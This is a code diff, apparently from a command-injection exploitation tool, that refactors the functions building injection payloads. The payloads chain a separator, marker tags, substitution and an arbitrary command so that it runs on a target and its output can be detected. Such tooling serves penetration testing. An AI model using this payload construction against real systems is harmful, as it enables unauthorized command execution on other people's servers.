@@ -43,8 +43,8 @@ def decision(separator, TAG, randv1, randv2):
   else:
     if settings.SKIP_CALC:
       payload = (separator +
-                "echo " + TAG +
-                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG
+                checks.print_words(TAG +
+                settings.CMD_SUB_PREFIX + checks.print_marker(TAG) + settings.CMD_SUB_SUFFIX  + TAG)
                 )
     else:
       if checks.using_backticks() or settings.WAF_ENABLED:
@@ -53,9 +53,9 @@ def decision(separator, TAG, randv1, randv2):
         # Arithmetic expansion is the substitution pair with one more set of parentheses inside it.
         math_calc = settings.CMD_SUB_PREFIX + "(" + str(randv1) + "+" + str(randv2) + ")" + settings.CMD_SUB_SUFFIX
       payload = (separator +
-                "echo " + TAG +
+                checks.print_words(TAG +
                 math_calc +
-                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
+                settings.CMD_SUB_PREFIX + checks.print_marker(TAG) + settings.CMD_SUB_SUFFIX  + TAG)
                 )
 
     payload = checks.terminate_payload(payload, separator, keep_output=True)
@@ -165,17 +165,18 @@ def cmd_execution(separator, TAG, cmd):
       # newline left for the page to lose.
       payload = (separator +
                 "printf " + TAG +
-                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  +
+                settings.CMD_SUB_PREFIX + "printf " + TAG + settings.CMD_SUB_SUFFIX  +
                 "%s" +
-                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG +
+                settings.CMD_SUB_PREFIX + "printf " + TAG + settings.CMD_SUB_SUFFIX  + TAG +
                 " \"" + single_line_output(cmd) + "\""
                 )
     else:
+      # Printed through the one command checks.print_words() names, and the markers through the same.
       payload = (separator +
-                "echo " + TAG +
-                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  +
+                checks.print_words(TAG +
+                settings.CMD_SUB_PREFIX + checks.print_marker(TAG) + settings.CMD_SUB_SUFFIX  +
                 settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX +
-                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG
+                settings.CMD_SUB_PREFIX + checks.print_marker(TAG) + settings.CMD_SUB_SUFFIX  + TAG)
                 )
 
     payload = checks.terminate_payload(payload, separator, keep_output=True)
